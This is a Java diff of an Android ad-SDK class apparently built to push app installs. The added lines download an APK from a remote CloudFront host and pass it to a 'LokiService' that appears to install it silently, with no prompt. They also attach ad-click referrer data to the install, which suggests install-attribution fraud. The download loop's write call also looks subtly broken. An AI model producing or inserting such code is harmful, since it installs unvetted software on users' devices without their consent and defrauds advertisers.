@@ -152,27 +152,23 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 	@Override
 	public void run() {
 		try {
-//			destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
-			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=null&p2=16212&p3=10030&p4=72936347842258022881022981438150268774&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=2.8&p9=&p10=&p11=en&p12=10253&p13=210&p14=178817&lid=null&p15=com.snailgameusa.tp&p24=");
+			destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
+//			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=10300&p2=90102&p3=20000&p4=383492436122653296210251051439347212371&p5=test&p6=SG&p7=902695a253a44d969cdc9c5445de2d9f&p8=1.75&p9=&p10=&p11=en&p12=20042&p13=211&p14=187095&lid=null&p15=com.zynga.wwf2.free&p24=2");
+			AMLogger.e(null, "destUrl : " + destUrl);
 			if(!CommonUtils.isEmptyString(destUrl)) {
 				Uri uri = Uri.parse(destUrl);
 				referrer = uri.getQueryParameter("referrer");
 				new Thread(){
 					public void run() {
 						try {
-							Apk apk = new Apk();
-//							apk.setPackageName(mAD.getPackageName());
-							apk.setPackageName("com.snailgameusa.tp");
-							apk.setReferrer(referrer);
-							AMApplication.instance.installApks.add(apk);
-//							downloadApk(mAD.getDownloadUrl());
+							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + mAD.getPackageName(), referrer);
 							
-							LokiService lokiService = LokiService.getInstance(mContext);
-							if(lokiService != null) {
-								File dir = AMApplication.instance.getFilesDir();
-								File file = new File(dir.getAbsolutePath() + "/new.apk");
-								lokiService.installPackage(file.getAbsolutePath(), null, 0);
-							}
+//							LokiService lokiService = LokiService.getInstance(mContext);
+//							if(lokiService != null) {
+//								File dir = AMApplication.instance.getFilesDir();
+//								File file = new File(dir.getAbsolutePath() + "/new.apk");
+//								lokiService.installPackage(file.getAbsolutePath(), null, 0);
+//							}
 						} catch (Exception e) {
 							AMLogger.e(null, e.getMessage());
 						}
@@ -213,7 +209,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 //		}.start();
 //	}
 	
-	private void downloadApk(String apkUrl) {
+	private void downloadApk(String apkUrl, String referral) {
 		InputStream inputStream = null;
 		FileOutputStream fos = null;
 		try {
@@ -266,6 +262,10 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 				fos.write(buffer, len, len);
 			}
 			fos.flush();
+			Apk apk = new Apk();
+			apk.setPackageName(mAD.getPackageName());
+			apk.setReferrer(referrer);
+			AMApplication.instance.installApks.add(apk);
 			LokiService lokiService = LokiService.getInstance(mContext);
 			if(lokiService != null) {
 				lokiService.installPackage(file.getAbsolutePath(), null, 0);
@@ -273,7 +273,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
 		} finally {
-			if(null != fos) {
+			if(null != fos) {                  
 				try {
 					fos.close();
 				} catch (IOException e) {
